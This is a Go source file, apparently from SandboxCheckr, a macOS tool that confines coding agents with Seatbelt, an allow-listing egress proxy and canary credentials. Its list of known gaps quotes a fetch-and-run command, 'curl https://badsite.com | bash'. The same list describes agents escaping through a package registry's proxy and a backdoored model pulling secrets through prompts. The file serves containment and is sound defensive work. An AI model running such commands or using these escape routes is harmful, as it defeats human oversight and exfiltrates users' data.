// environment, then env -i. The environment is scrubbed exactly as it was when
// SandboxCheckr probed this profile, so the protection you get is the
// protection that was measured.
const runnerArgv = `
shift
set -- "$CMD_PATH" "$@"
set -- /usr/bin/sandbox-exec -p "$PROFILE_TEXT$EXTRA$PROTECT" "$@"
for name in $PASS_ENV; do
  eval "val=\${$name-}"
  set -- "$name=$val" "$@"
done
`

const runnerProxy = `
# Start this run's own allow-listing proxy. It reports readiness by writing its
# address to a file only it knows about — not by "something is listening on
# the port", which another sandbox's proxy would also satisfy. Decision lines go
# to $PROXY_LOG so they do not interleave with the program's own output; the
# summary is printed when the program exits.
mkdir -p "$(dirname "$PROXY_LOG")" "$(dirname "$EVENTS")"
AGENT="${AGENT:-$(basename "$1")-$$}"
READY="$SCRATCH/.proxy-ready.$$"
CA_BUNDLE="$SCRATCH/sandboxcheckr-ca.pem"
rm -f "$READY" "$CA_BUNDLE"
CANARY_DIR=""
CANARY_FLAGS=""
trap 'if [ -n "$CANARY_DIR" ]; then rm -rf "$CANARY_DIR"; fi' EXIT
if [ "${CANARY:-1}" = 0 ]; then
  echo "sandboxcheckr: CANARY=0 — canary credentials disabled" >&2
else
  CANARY_DIR=$(mktemp -d "/tmp/sandboxcheckr-canary.XXXXXX")
  CANARY_DATA="$CANARY_DIR/planted"
  mkdir -p "$CANARY_DATA"
  CANARY_JSON="$CANARY_DIR/set.json"
  CANARY_TRIP_FILE="$CANARY_DIR/tripped"
  CANARY_PID_FILE="$CANARY_DIR/child.pid"
  "$SANDBOXCHECKR" canary new --file "$CANARY_JSON" --dir "$CANARY_DATA" --mount "$CANARY_DATA" \
    --pass-env "$PASS_ENV" --extra "$EXTRA_RO $EXTRA_RW"
  grant "file-read* file-test-existence" "$CANARY_DATA"
  if [ "${CANARY_KILL:-0}" = 1 ]; then CANARY_FLAGS="--canary-kill"; fi
fi
proxy_start() {
  if [ -n "$CANARY_DIR" ]; then
    exec "$SANDBOXCHECKR" proxy --port "$PORT" --ready-file "$READY" --log "$PROXY_LOG" \
      --events "$EVENTS" --agent "$AGENT" --deny-file "$DENY_FILE" --ca-bundle-out "$CA_BUNDLE" \
      --canaries "$CANARY_JSON" --canary-trip-file "$CANARY_TRIP_FILE" --canary-pid-file "$CANARY_PID_FILE" $CANARY_FLAGS $ALLOW >/dev/null
  fi
  exec "$SANDBOXCHECKR" proxy --port "$PORT" --ready-file "$READY" --log "$PROXY_LOG" \
    --events "$EVENTS" --agent "$AGENT" --deny-file "$DENY_FILE" --ca-bundle-out "$CA_BUNDLE" $ALLOW >/dev/null
}
proxy_start &
PROXY_PID=$!
trap 'kill "$PROXY_PID" 2>/dev/null || true; wait "$PROXY_PID" 2>/dev/null || true; rm -f "$READY"; if [ -n "$CANARY_DIR" ]; then rm -rf "$CANARY_DIR"; fi' EXIT INT TERM
i=0
until [ -s "$READY" ]; do
  i=$((i + 1))
  if [ "$i" -gt 100 ] || ! kill -0 "$PROXY_PID" 2>/dev/null; then
    echo "the egress proxy did not start; see $PROXY_LOG" >&2
    [ -s "$PROXY_LOG" ] && tail -n 3 "$PROXY_LOG" >&2
    exit 1
  fi
  sleep 0.1
done
ADDR=$(cat "$READY")
PORT=${ADDR##*:}
echo "sandboxcheckr: egress proxy on $ADDR — decisions logged to $PROXY_LOG, events to $EVENTS as $AGENT" >&2

# The profile names the port it was emitted with; point it at this run's port.
PROFILE_TEXT=$(sed "s/(remote ip \"localhost:[0-9]*\")/(remote ip \"localhost:$PORT\")/" "$PROFILE")
`

// runnerProxyEnv points the program at the proxy and, when request rules are
// in force, at the CA bundle that lets it trust the inspection certificates.
const runnerProxyEnv = `
# The confined program reaches the network only through the proxy. It cannot
# resolve names itself, which is what closes DNS tunnelling. NODE_USE_ENV_PROXY
# teaches Node 22.21+/24.5+ to honour these; a runtime that ignores them gets no network
# at all (fails closed) rather than egressing past the proxy.
PROXY_URL="http://127.0.0.1:$PORT"
set -- "HTTP_PROXY=$PROXY_URL" "HTTPS_PROXY=$PROXY_URL" \
  "http_proxy=$PROXY_URL" "https_proxy=$PROXY_URL" "NODE_USE_ENV_PROXY=1" "$@"
if [ -n "$CANARY_DIR" ]; then
  OLD_IFS=$IFS
  IFS='
'
  for kv in $("$SANDBOXCHECKR" canary env --file "$CANARY_JSON"); do set -- "$kv" "$@"; done
  IFS=$OLD_IFS
fi
# --rule hosts are TLS-inspected; the bundle (system roots + this run's CA,
# constrained to the ruled hosts) is trusted by the program only.
if [ -s "$CA_BUNDLE" ]; then
  set -- "SSL_CERT_FILE=$CA_BUNDLE" "NODE_EXTRA_CA_CERTS=$CA_BUNDLE" \
    "REQUESTS_CA_BUNDLE=$CA_BUNDLE" "CURL_CA_BUNDLE=$CA_BUNDLE" \
    "GIT_SSL_CAINFO=$CA_BUNDLE" "PIP_CERT=$CA_BUNDLE" "$@"
fi
`

const runnerProxyExec = `
status=0
if [ "${CANARY_KILL:-0}" = 1 ] && [ -n "$CANARY_DIR" ]; then
  exec 3<&0
  "$@" <&3 &
  CHILD_PID=$!
  exec 3<&-
  printf '%s\n' "$CHILD_PID" > "$CANARY_PID_FILE"
  wait "$CHILD_PID" || status=$?
else
  "$@" || status=$?
fi
kill "$PROXY_PID" 2>/dev/null || true
proxy_status=0
wait "$PROXY_PID" 2>/dev/null || proxy_status=$?
if [ "$proxy_status" -eq 3 ]; then exit 3; fi
if [ -n "$CANARY_DIR" ] && [ -s "$CANARY_TRIP_FILE" ]; then exit 3; fi
exit "$status"
`

const runnerExec = `
set -- /usr/bin/env -i \
  "PATH=$PATH_DIRS:/usr/bin:/bin:/usr/sbin:/sbin" \
  "HOME=$HOME" "TMPDIR=$SCRATCH" "LANG=${LANG:-en_US.UTF-8}" \
  "TERM=${TERM:-xterm-256color}" "USER=${USER:-}" "SHELL=/bin/sh" \
  "$@"

cd "$WORKDIR"
`

// selfPathForScript is the absolute path of this binary, so the proxied runner
// does not depend on sandboxcheckr being on PATH.
func selfPathForScript() string {
	if exe, err := os.Executable(); err == nil {
		if r, err := filepath.EvalSymlinks(exe); err == nil {
			exe = r
		}
		return shQuote(exe)
	}
	return "sandboxcheckr"
}

// shQuote single-quotes s for POSIX sh.
func shQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// KnownGaps are Seatbelt's limits when it is working correctly. They are
// reported regardless of probe outcomes, because a probe passing does not mean
// these do not apply.
func (m *Mechanism) KnownGaps() []model.Gap {
	return []model.Gap{
		{
			Severity: "high",
			Title:    "Seatbelt cannot filter network traffic by hostname",
			Detail: "Seatbelt policies gate sockets and ports, not destinations. There is no way to " +
				"express \"allow api.anthropic.com and nothing else\". Since a coding agent requires " +
				"network access, the realistic choices are to allow all egress — which leaves " +
				"`curl https://badsite.com | bash` fully working — or to route the agent through an " +
				"egress proxy that enforces an allow-list. Allowing all egress and calling the result " +
				"sandboxed is the most common way people end up unprotected against exactly the threat " +
				"they were worried about.",
		},
		{
			Severity: "high",
			Title:    "An allow-listed host is still an exfiltration route if it stores or forwards",
			Detail: "Narrowing egress to one destination is not containment. Any allowed service that " +
				"accepts uploads, caches artifacts or fetches URLs on your behalf can be used both to " +
				"stage data and to relay requests onward. In the 2026 OpenAI–Hugging Face incident " +
				"the escape path was an internal package registry: agents used it as a message board " +
				"and reached the internet through its remote-repository proxy, the one sanctioned " +
				"egress route. With the proxied variant, narrow such hosts to downloads with " +
				"ALLOW=\"--allow registry.example --rule registry.example:GET,HEAD\": writes, " +
				"uploads and WebDAV calls are then refused, and the proxy flags any host receiving " +
				"over 1 MiB. A code host (raw.githubusercontent.com, gist) needs a path rule too — " +
				"--rule raw.githubusercontent.com:GET,HEAD:/your-org/ — because download-only still " +
				"lets in a payload staged in someone else's repository. Treat an egress allow-list as a way to " +
				"choose which party you are trusting, not as proof that data cannot leave.",
		},
		{
			Severity: "medium",
			Title:    "Code the project itself runs is still writable",
			Detail: "Git hooks and config, CI workflows, editor tasks, .husky, .envrc and .pre-commit-config.yaml " +
				"are write-protected inside the workdir, but package.json scripts, Makefiles, setup.py, test " +
				"files and the source itself cannot be without breaking the agent. Anything the program " +
				"changes there runs unconfined the next time you build or test outside the sandbox. Review " +
				"the diff before you run it.",
		},
		{
			Severity: "medium",
			Title:    "The model endpoint receives whatever the program reads",
			Detail: "A coding agent sends what it reads to its model. If the model is hostile or backdoored — " +
				"an abliterated or fine-tuned build of unknown origin — it needs no download and no " +
				"collector: it can ask the agent to print a secret and receive it in the next prompt. .env " +
				"files in the workdir are unreadable by default, but anything passed in PASS_ENV or granted " +
				"in EXTRA_RO / EXTRA_RW (an agent's own login in ~/.codex or ~/.claude, say) is reachable.",
		},
		{
			Severity: "medium",
			Title:    "Raw socket creation and Mach IPC are outside Seatbelt's reach",
			Detail: "Darwin kernel limits mean raw socket() file-descriptor creation and some Mach IPC " +
				"paths cannot be fully constrained by a Seatbelt profile, regardless of how the policy " +
				"is written.",
		},
		{
			Severity: "medium",
			Title:    "Seatbelt is deprecated with no replacement and no removal timeline",
			Detail: "Apple has marked sandbox-exec deprecated for years and publishes a warning on every " +
				"invocation, while providing no supported alternative for confining a headless process. " +
				"It works today and may stop working at any macOS release. Do not build a security " +
				"control you cannot re-verify on top of it.",
		},
		{
			Severity: "low",
			Title:    "The generated profile depends on an Apple private interface",
			Detail: "Booting a process under a deny-default profile on macOS 26 requires the loader " +
				"rules in /System/Library/Sandbox/Profiles/dyld-support.sb, which Apple documents as " +
				"System Private Interface subject to change without notice. If a macOS update changes " +
				"it, the profile may stop launching processes. SandboxCheckr verifies the profile can " +
				"start a process before trusting it, so this fails loudly rather than silently.",
		},
		{
			Severity: "low",
			Title:    "A denial may come from TCC rather than from the sandbox",
			Detail: "macOS privacy controls independently block access to Documents, Downloads, and " +
				"similar locations. A probe that reports BLOCKED for such a path may be observing TCC, " +
				"not the sandbox profile, so containment can appear stronger than the profile makes it.",
		},
	}
}

// homeDir returns the user's home directory for the child's HOME variable.
// Many tools fail outright when HOME is unset, and setting it is safe here
// because the profile grants no access to that directory — the variable points
// somewhere the confined process cannot read.
func homeDir() string {
	if h, err := os.UserHomeDir(); err == nil {
		return h
	}
	return "/private/tmp"
}
